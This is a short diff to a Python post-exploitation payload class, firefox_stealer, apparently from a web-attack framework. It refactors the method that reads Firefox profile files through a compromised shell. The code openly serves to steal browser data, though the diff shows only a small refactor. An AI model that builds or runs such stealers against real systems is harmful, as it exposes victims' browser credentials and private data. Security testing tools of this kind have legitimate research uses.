@@ -7,7 +7,7 @@ class firefox_stealer(base_payload):
     '''
     This payload steals Mozilla Firefox information
     '''
-    def run_read(self):
+    def api_read(self):
         result = []
         files = []
 
@@ -44,6 +44,10 @@ class firefox_stealer(base_payload):
                 result.append(self.shell.read(file))
 
         result = [p for p in result if p != '']
+        return result
+    
+    def run_read(self):
+        result = self.api_read()
         if result == [ ]:
             om.out.console('Server is configured correctly, cant steal firefox information.')
         return result
